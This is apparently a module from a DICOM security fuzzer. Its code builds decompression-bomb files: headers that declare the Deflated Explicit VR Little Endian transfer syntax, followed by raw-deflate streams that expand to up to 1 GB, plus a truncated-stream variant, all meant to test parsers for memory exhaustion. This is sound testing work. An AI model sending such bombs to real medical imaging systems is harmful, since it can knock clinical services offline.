"""Deflate Bomb Fuzzer - Decompression Bomb via Deflated Transfer Syntax.

Category: generic

Attacks the Deflated Explicit VR Little Endian transfer syntax
(1.2.840.10008.1.2.1.99 / PS3.5 Section 10) by replacing the
post-FMI data section with a raw-deflate stream that decompresses to
hundreds of megabytes or gigabytes of zeros.

Parsers that decompress without checking the output size first will
exhaust available memory before returning an error.

References:
- Orthanc CVE-2026-5438 (CWE-400): gzip payload without decompression
  limit causes memory exhaustion
- Orthanc CVE-2026-5439 (CWE-400): forged uncompressed-size in ZIP
  metadata triggers pre-allocation of 4 GB
- ACM CCS 2022: Deflated LE transfer syntax as zip bomb attack surface

"""

from __future__ import annotations

import random
import struct
import zlib

from pydicom.dataset import Dataset
from pydicom.uid import generate_uid

from dicom_fuzzer.utils.logger import get_logger

from .base import FormatFuzzerBase

logger = get_logger(__name__)

_DEFLATED_TS = "1.2.840.10008.1.2.1.99"  # Deflated Explicit VR Little Endian
_CT_SOP_CLASS = "1.2.840.10008.5.1.4.1.1.2"  # CT Image Storage (dummy seed)

# Bomb sizes: (label, decompressed_bytes)
# All compress to roughly 1/1000 of listed size at zlib level-9.
_BOMB_SIZES = {
    "small": 128 * 1024 * 1024,  # 128 MB uncompressed  → ~128 KB file
    "medium": 512 * 1024 * 1024,  # 512 MB uncompressed  → ~512 KB file
    "large": 1024 * 1024 * 1024,  # 1   GB uncompressed  → ~1 MB file
}


def _encode_ui(tag_group: int, tag_elem: int, value: str) -> bytes:
    """Return a UI-VR element encoded in Explicit VR Little Endian."""
    raw = value.encode("ascii")
    if len(raw) % 2:
        raw += b"\x00"  # CS/UI must be even-length; pad with null
    return (
        struct.pack("<HH", tag_group, tag_elem)
        + b"UI"
        + struct.pack("<H", len(raw))
        + raw
    )


def _build_fmi(sop_class: str, sop_uid: str) -> bytes:
    r"""Build a minimal File Meta Information group for _DEFLATED_TS.

    Constructs the following mandatory FMI elements (Explicit VR LE):
      (0002,0001) OB  File Meta Information Version = \x00\x01
      (0002,0002) UI  Media Storage SOP Class UID
      (0002,0003) UI  Media Storage SOP Instance UID
      (0002,0100) UI  Transfer Syntax UID = Deflated Explicit VR LE
    Prepends (0002,0000) UL FMI Group Length as required by PS3.10.

    Returns bytes starting at (0002,0000), not including the preamble.
    """
    fmi_version = (
        struct.pack("<HH", 0x0002, 0x0001)
        + b"OB"
        + b"\x00\x00"  # 2-byte reserved (required for OB in Explicit VR)
        + struct.pack("<I", 2)  # 4-byte length for OB/OW
        + b"\x00\x01"
    )
    body = (
        fmi_version
        + _encode_ui(0x0002, 0x0002, sop_class)
        + _encode_ui(0x0002, 0x0003, sop_uid)
        + _encode_ui(0x0002, 0x0100, _DEFLATED_TS)
    )
    group_length = (
        struct.pack("<HH", 0x0002, 0x0000)
        + b"UL"
        + struct.pack("<H", 4)  # UL value is always 4 bytes
        + struct.pack("<I", len(body))
    )
    return group_length + body


def _find_fmi_end(data: bytes) -> int:
    """Return the byte offset of the first data element after the FMI.

    Scans past the preamble and DICM magic, then advances element-by-element
    while the tag group is 0x0002.  Returns 132 (= preamble + magic) when no
    FMI is present or the data is too short to parse.

    Args:
        data: Raw DICOM file bytes.

    Returns:
        Offset of first non-FMI element (or 132 on parse failure).

    """
    offset = 132  # skip 128-byte preamble + b"DICM"
    _long_vrs = frozenset(b"OB OD OF OL OV OW SQ UC UN UR UT".split())
    while offset + 8 <= len(data):
        group = struct.unpack_from("<H", data, offset)[0]
        if group != 0x0002:
            break
        vr = data[offset + 4 : offset + 6]
        if vr in _long_vrs:
            if offset + 12 > len(data):
                break
            elem_len = struct.unpack_from("<I", data, offset + 8)[0]
            offset += 12 + elem_len
        else:
            if offset + 8 > len(data):
                break
            elem_len = struct.unpack_from("<H", data, offset + 6)[0]
            offset += 8 + elem_len
    return offset


class DeflateBombFuzzer(FormatFuzzerBase):
    """Decompression bomb via Deflated Explicit VR Little Endian transfer syntax.

    The DICOM standard permits deflating the data elements that follow the
    File Meta Information using raw DEFLATE (RFC 1951, no zlib/gzip wrapper).
    Implementations that do not impose an upper bound on the decompressed
    output will allocate as much memory as the bomb demands.

    All mutation work is in mutate_bytes() because pydicom does not
    support the Deflated LE transfer syntax for writing; the post-FMI
    bytes must be constructed manually.

    Variants:
        small:      128 MB uncompressed (~128 KB file)
        medium:     512 MB uncompressed (~512 KB file)
        large:      1 GB uncompressed   (~1 MB file)
        corrupted:  Syntactically invalid stream (tests error recovery)
    """

    @property
    def strategy_name(self) -> str:
        """Return the strategy name for identification."""
        return "deflate_bomb"

    def mutate(self, dataset: Dataset) -> Dataset:
        """No dataset-level changes; all mutation happens in mutate_bytes."""
        self.last_variant = None
        return dataset

    def mutate_bytes(self, file_data: bytes) -> bytes:
        """Replace post-FMI content with a raw-deflate decompression bomb.

        Extracts the SOP Class and Instance UIDs from the incoming file,
        builds a fresh FMI that declares Deflated LE transfer syntax, then
        appends a crafted raw-deflate payload.

        Args:
            file_data: Serialized DICOM bytes from the engine.

        Returns:
            New DICOM bytes with a deflate-bomb payload in the data section.

        """
        self._applied_binary_mutations = []

        variant = random.choice(["small", "medium", "large", "corrupted"])

        # Extract SOP identifiers from incoming FMI so the result looks plausible
        sop_class, sop_uid = self._extract_sop_ids(file_data)

        fmi_bytes = _build_fmi(sop_class, sop_uid)

        if variant == "corrupted":
            payload = self._corrupted_stream()
        else:
            payload = self._make_bomb(_BOMB_SIZES[variant])

        result = b"\x00" * 128 + b"DICM" + fmi_bytes + payload

        self._applied_binary_mutations.append(f"deflate_bomb_{variant}")
        self.last_variant = f"deflate_bomb_{variant}"
        logger.debug(
            "DeflateBombFuzzer: variant=%s compressed=%d",
            variant,
            len(payload),
        )
        return result

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _extract_sop_ids(self, file_data: bytes) -> tuple[str, str]:
        """Return (sop_class_uid, sop_instance_uid) from the incoming file.

        Falls back to a dummy CT SOP class and a freshly generated UID
        if the FMI cannot be parsed (e.g. the file is too short or corrupt).
        """
        try:
            import io

            import pydicom

            ds = pydicom.dcmread(
                io.BytesIO(file_data), stop_before_pixels=True, force=True
            )
            sop_class = str(
                getattr(
                    getattr(ds, "file_meta", None),
                    "MediaStorageSOPClassUID",
                    _CT_SOP_CLASS,
                )
            )
            sop_uid = str(
                getattr(
                    getattr(ds, "file_meta", None),
                    "MediaStorageSOPInstanceUID",
                    generate_uid(),
                )
            )
            return sop_class, sop_uid
        except Exception:
            return _CT_SOP_CLASS, generate_uid()

    @staticmethod
    def _make_bomb(decompressed_size: int) -> bytes:
        """Return a raw-DEFLATE stream that expands to decompressed_size zeros.

        Uses wbits=-15 (raw deflate, no zlib wrapper) and compression level 9
        to maximise the compression ratio.  Data is fed in 64 KB chunks to
        avoid allocating the full uncompressed buffer at once.

        Args:
            decompressed_size: Desired decompressed output size in bytes.

        Returns:
            Compressed bytes (raw DEFLATE, no header or checksum).

        """
        chunk_size = 65_536
        compressor = zlib.compressobj(level=9, method=zlib.DEFLATED, wbits=-15)
        parts: list[bytes] = []
        remaining = decompressed_size
        while remaining > 0:
            n = min(chunk_size, remaining)
            parts.append(compressor.compress(b"\x00" * n))
            remaining -= n
        parts.append(compressor.flush())
        return b"".join(parts)

    @staticmethod
    def _corrupted_stream() -> bytes:
        """Return a malformed raw-DEFLATE stream for error-recovery testing.

        Declares a stored (non-compressed) block with LEN=8192 but provides
        only 4 bytes of payload.  A compliant decompressor must raise an error
        at premature EOF.  This exercises the parser's error-handling path
        rather than its memory limits.

        BFINAL=0: not the final block (bit 0 of header byte = 0).
        BTYPE=00: stored mode (bits 1-2 of header byte = 00).
        LEN/NLEN: one's complement pair per RFC 1951 Section 3.2.4.
        """
        return (
            struct.pack("<B", 0x00)  # BFINAL=0, BTYPE=00
            + struct.pack("<HH", 8192, ~8192 & 0xFFFF)  # LEN=8192, NLEN=~LEN
            + b"FUZZ"  # 4 bytes (far short of 8192)
        )


__all__ = ["DeflateBombFuzzer"]
